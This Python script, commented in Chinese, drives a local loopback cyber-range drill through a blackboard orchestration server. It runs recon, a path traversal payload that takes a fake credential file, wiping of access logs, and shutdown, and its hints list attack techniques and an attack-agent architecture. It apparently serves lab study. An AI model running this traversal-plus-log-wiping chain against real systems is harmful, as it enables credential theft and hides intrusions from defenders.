"""WorkBuddy 本地 worker —— 不用任何 LLM，直接驱动 Cairn 黑板编排靶场演练。

原理：Cairn Server 只是一块 HTTP 黑板（Fact/Intent/Hint 图），worker 只是个字符串标识。
本脚本让 WorkBuddy 自己充当 worker：读图 -> 认领 Intent -> 执行真实靶场动作 -> 写回 Fact。
大模型配置（claude/codex/pi + API key）一概不用。全部动作限本地回环 127.0.0.0/8。

用法: python cairn_local_worker.py <server_url> <range_dir>
"""
import datetime
import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request

SERVER = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8765"
HERE = sys.argv[2] if len(sys.argv) > 2 else os.path.join(os.path.dirname(os.path.abspath(__file__)), "range")
ART = os.path.join(HERE, "artifacts")
PY = sys.executable
WORKER = "workbuddy-local"          # 无 LLM 的本地 worker 标识
os.makedirs(ART, exist_ok=True)

TRACE = []


def ts():
    return datetime.datetime.now().isoformat(timespec="seconds")


def trace(phase, detail):
    rec = {"ts": ts(), "phase": phase, "detail": detail}
    TRACE.append(rec)
    print(f"[{rec['ts']}] {phase}: {detail}", flush=True)


def api(method, path, body=None, raw=False):
    url = SERVER.rstrip("/") + path
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    with urllib.request.urlopen(req, timeout=15) as r:
        out = r.read()
        if raw:
            return out.decode("utf-8", "replace")
        return json.loads(out) if out else None


def run(script, args):
    return subprocess.run([PY, os.path.join(HERE, script)] + args,
                          capture_output=True, text=True, timeout=60)


# 真实案例调研得到的攻击关键词（写入黑板 Hint，供 worker 读图时对齐战术）
CASE_HINTS = [
    "真实案例-韩国金融: CrowdStrike 报中国语系行为体攻击韩国银行, 贷款查询服务+员工移动系统, 约67000人数据泄露 (FBI 2026-11-13 FLASH)",
    "真实案例-供应链: Storm-0940 借 ConnectWise Cloud Backup 供应链, 用 ARTEX 尝试登录 2250+ 租户, 多数未成功",
    "真实案例-间谍: VAPOR PANDA 用 ARTEX 打 200+ 组织/14国(外交部/制药/半导体/国防/核), 警戒 4 小时级",
    "真实案例-Amazon诱捕: MadPot 假 LLM API 10/03-11/05 收到 agent 上传的完整作战记忆, 证实 shared memory 架构",
    "真实武器库关键词: 目录穿越CWE-22 / 默认口令 / SSRF云元数据 / XXE / alg:none JWT / Kerberoasting / 凭证外带 / 日志擦除",
    "ARTEX架构词: planner+worker+verification+compression 四类agent, 持久化 knowledge graph 作共享记忆(共享大脑), Go+Next.js+PostgreSQL",
    "速度指标: 初始目标到特权访问最短<3小时(Microsoft); 单次agent突发2-25秒; 密码喷洒约1次/秒",
    "反制启示: 失陷多因基础卫生缺失(默认口令/暴露接口/未打补丁), 非0day; 日志集中外发可反制痕迹擦除",
]


def main():
    # 0 放宽超时，避免本地起服务的几秒被判超时清空 claim
    api("PUT", "/settings", {"intent_timeout": 120, "reason_timeout": 120})

    # 1 建项目：origin=本地靶场, goal=凭证外带+痕迹擦除闭环；真实案例词作 Hint 注入共享大脑
    proj = api("POST", "/projects", {
        "title": "ARTEX 案例关键词本地靶场复现（Cairn 黑板驱动 / 无 LLM worker）",
        "origin": "本地回环靶场 attacker-127.0.0.1 -> jump1-127.0.0.2:9001 -> jump2-127.0.0.3:9002 -> victim-127.0.0.4:8080",
        "goal": "复现凭证外带并擦除痕迹, 全部动作写回黑板并产出可核对证据",
        "bootstrap_enabled": True,
        "hints": [{"content": h, "creator": "case-research"} for h in CASE_HINTS],
    })
    pid = proj["project"]["id"]
    trace("project", f"创建 {pid}: {proj['project']['title']}")
    trace("hints", f"注入真实案例关键词 {len(CASE_HINTS)} 条到共享黑板")

    # 2 清理旧日志
    for f in ["victim_access.log", "jump_j1_access.log", "jump_j2_access.log"]:
        p = os.path.join(ART, f)
        if os.path.exists(p):
            os.remove(p)

    procs = []

    def start(script, args):
        p = subprocess.Popen([PY, os.path.join(HERE, script)] + args,
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                             creationflags=getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0))
        procs.append(p)
        return p

    def wait_http(url, tries=30):
        for _ in range(tries):
            try:
                urllib.request.urlopen(url, timeout=1).read()
                return True
            except Exception:
                time.sleep(0.2)
        return False

    def claim(intent_id):
        api("POST", f"/projects/{pid}/intents/{intent_id}/heartbeat", {"worker": WORKER})

    def conclude(intent_id, desc):
        return api("POST", f"/projects/{pid}/intents/{intent_id}/conclude",
                   {"worker": WORKER, "description": desc})

    def new_intent(frm, desc):
        return api("POST", f"/projects/{pid}/intents",
                   {"from": frm, "description": desc, "creator": WORKER, "worker": None})

    # 3 BOOTSTRAP：认领 bootstrap intent，直接起靶场 + 边界护栏
    boot = api("POST", f"/projects/{pid}/intents",
               {"from": ["origin"], "description": "bootstrap", "creator": "dispatcher.bootstrap", "worker": None})
    claim(boot["id"])
    trace("bootstrap", "认领 bootstrap intent, 准备靶场")

    start("victim_server.py", ["8080"])
    start("jump_host.py", ["127.0.0.3", "9002", "127.0.0.4:8080", "j2"])
    start("jump_host.py", ["127.0.0.2", "9001", "127.0.0.3:9002", "j1"])
    time.sleep(0.6)
    ready = wait_http("http://127.0.0.2:9001/")
    trace("bootstrap", f"三级服务起完, 入口连通={'OK' if ready else 'FAIL'}")

    gr = run("boundary_guard.py", ["127.0.0.4:8080", "127.0.0.2:9001", "127.0.0.3:9002"])
    bad = run("boundary_guard.py", ["127.0.0.4:8080", "1.2.4.8:80", "8.8.8.8:53"])
    guard_ok = (gr.returncode == 0 and bad.returncode == 2)
    trace("bootstrap", f"边界护栏 正向exit={gr.returncode}/反向exit={bad.returncode} -> {'PASS' if guard_ok else 'FAIL'}")
    f_boot = conclude(boot["id"],
        f"靶场三级服务启动(127.0.0.2:9001->.3:9002->.4:8080), 入口连通={'OK' if ready else 'FAIL'}; "
        f"边界护栏正向ALLOW(exit0)/反向DENY(exit2)={'PASS' if guard_ok else 'FAIL'}, 仅放行回环, 公网含中国IP拒绝"
    )["fact"]
    origin_fact = f_boot["id"]

    # 4 REASON：声明 4 个 explore intent（对应真实案例的 4 个战术动作）
    api("POST", f"/projects/{pid}/reason/claim", {"worker": WORKER, "trigger": "after_bootstrap"})
    i_recon = new_intent([origin_fact], "侦察探活+关键词映射(对齐真实案例暴露面)")
    i_exploit = new_intent([origin_fact], "目录穿越CWE-22凭证外带(对齐韩国银行案凭证窃取)")
    i_wipe = new_intent([origin_fact], "擦除攻击日志痕迹(对齐真实案例anti-forensics)")
    i_down = new_intent([origin_fact], "关停靶场服务(用完即关)")
    api("POST", f"/projects/{pid}/reason/release", {"worker": WORKER})
    trace("reason", f"声明 4 个 explore intent: recon/exploit/wipe/down")

    # 5 逐个认领执行（OODA：读图->认领->真实动作->写回）
    # recon
    claim(i_recon["id"])
    probe = urllib.request.urlopen("http://127.0.0.2:9001/", timeout=5)
    probe_code = probe.status
    trace("exploit/recon", f"经跳板探活 HTTP {probe_code}")
    f_recon = conclude(i_recon["id"],
        f"经两级跳板对靶机探活 HTTP {probe_code}; 结合黑板Hint对齐真实案例暴露面(默认口令/暴露接口/未打补丁), "
        f"本靶场选目录穿越CWE-22作可复现入口"
    )["fact"]

    # exploit（护栏已 PASS 才执行）
    claim(i_exploit["id"])
    payload = "/file?name=../secrets/credential.txt"
    loot = os.path.join(ART, "loot_credential.txt")
    atk = run("attacker.py", ["127.0.0.2:9001", payload, loot])
    loot_bytes = os.path.getsize(loot) if os.path.exists(loot) else 0
    trace("exploit", f"目录穿越外带凭证 {loot_bytes} 字节 (护栏PASS后才执行)")
    f_exploit = conclude(i_exploit["id"],
        f"经jump1->jump2->victim发起../secrets/credential.txt目录穿越, HTTP200, "
        f"外带凭证{loot_bytes}字节->artifacts/loot_credential.txt(靶场假凭证无真实效力)"
    )["fact"]

    # wipe
    claim(i_wipe["id"])
    before = {}
    for f in ["victim_access.log", "jump_j1_access.log", "jump_j2_access.log"]:
        p = os.path.join(ART, f)
        before[f] = open(p).read() if os.path.exists(p) else ""
    with open(os.path.join(ART, "logs_before_wipe.json"), "w", encoding="utf-8") as fp:
        json.dump(before, fp, ensure_ascii=False, indent=2)
    wp = run("wiper.py", ["../secrets"])
    after_rows = {}
    for f in before:
        p = os.path.join(ART, f)
        lines = open(p).read().splitlines() if os.path.exists(p) else []
        after_rows[f] = len(lines)
    trace("exploit/wipe", f"擦除../secrets特征行, 擦后行数={after_rows}")
    f_wipe = conclude(i_wipe["id"],
        f"擦除含../secrets特征日志行, 擦前快照->logs_before_wipe.json, 被删原文->wiped_rows.json, "
        f"擦后行数victim={after_rows.get('victim_access.log')}/j1={after_rows.get('jump_j1_access.log')}/j2={after_rows.get('jump_j2_access.log')}"
    )["fact"]

    # down
    claim(i_down["id"])
    for p in procs:
        try:
            p.terminate()
        except Exception:
            pass
    time.sleep(0.5)
    for p in procs:
        if p.poll() is None:
            try:
                p.kill()
            except Exception:
                pass
    trace("cleanup", "所有靶场进程已关闭(用完即关)")
    f_down = conclude(i_down["id"], "靶场三级服务进程全部terminate/kill, 8080/9001/9002端口释放, 无残留")["fact"]

    # 6 REASON->COMPLETE：判断 goal 满足，完成项目
    api("POST", f"/projects/{pid}/reason/claim", {"worker": WORKER, "trigger": "final_reason"})
    api("POST", f"/projects/{pid}/complete", {
        "from": [f_exploit["id"], f_wipe["id"], f_down["id"]],
        "description": "凭证已外带+日志已擦除+服务已关停, goal闭环; 全链事实写回黑板, 守护栏未碰公网",
        "worker": WORKER,
    })
    # 注意: complete 会自动清空 reason lease, 不可再 release(协议规定, 否则 403)
    trace("complete", f"项目 {pid} 判定完成")

    # 7 导出黑板快照作为报告数据源（真实图，非手写）
    yaml_snap = api("GET", f"/projects/{pid}/export?format=yaml", raw=True)
    timeline = api("GET", f"/projects/{pid}/export?format=timeline", raw=True)
    with open(os.path.join(ART, "cairn_board_export.yaml"), "w", encoding="utf-8") as fp:
        fp.write(yaml_snap)
    with open(os.path.join(ART, "cairn_board_timeline.txt"), "w", encoding="utf-8") as fp:
        fp.write(timeline)
    with open(os.path.join(ART, "cairn_worker_trace.jsonl"), "w", encoding="utf-8") as fp:
        for r in TRACE:
            fp.write(json.dumps(r, ensure_ascii=False) + "\n")
    trace("export", "黑板YAML/timeline + worker trace 已落盘 artifacts/")

    # 8 回读项目终态做自检
    final = api("GET", f"/projects/{pid}")
    trace("verify", f"项目终态 status={final['project']['status']}, facts={len(final['facts'])}, "
                    f"intents={len(final['intents'])}, hints={len(final['hints'])}")
    print("DONE", flush=True)


if __name__ == "__main__":
    main()
